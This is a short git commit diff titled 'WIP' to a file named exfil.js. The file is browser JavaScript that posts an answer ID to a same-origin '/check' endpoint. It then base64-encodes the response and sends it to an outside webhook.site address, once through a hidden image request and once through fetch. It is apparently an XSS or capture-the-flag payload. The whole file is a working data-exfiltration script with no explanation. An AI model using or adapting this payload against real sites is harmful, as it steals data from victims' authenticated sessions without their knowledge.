f1c45f570e1e0cd885447306c08d5e03bd176b6c
Tom Nightingale <tom@tnightingale.com>
2025-06-25 17:59:59 +0000

    WIP

--- exfil.js
+++ exfil.js
@@ -1,7 +1,15 @@
+var webhookUrl = "https://webhook.site/343d91a5-4ebb-428a-94b5-8f9d244196cf";
+var answerId = "f1eec86c-eb2c-483b-9b6e-c936e122b050";
 fetch("/check", {
   method: "POST",
   headers: {"Content-Type": "application/x-www-form-urlencoded"},
-  body: "answer_id=f1eec86c-eb2c-483b-9b6e-c936e122b050"
+  body: `answer_id=${answerId}`
 })
 .then(r => r.text())
-.then(t => fetch("https://webhook.site/343d91a5-4ebb-428a-94b5-8f9d244196cf?data=" + btoa(t)));
+.then(t => {
+    const exfilUrl = `${webhookUrl}?dataImg=${encodeURIComponent(btoa(t))}`;
+    const img = new Image();
+    img.src = exfilUrl;
+    document.body.appendChild(img);
+    return fetch(`${webhookUrl}?dataFetch=${btoa(t)}`)
+})
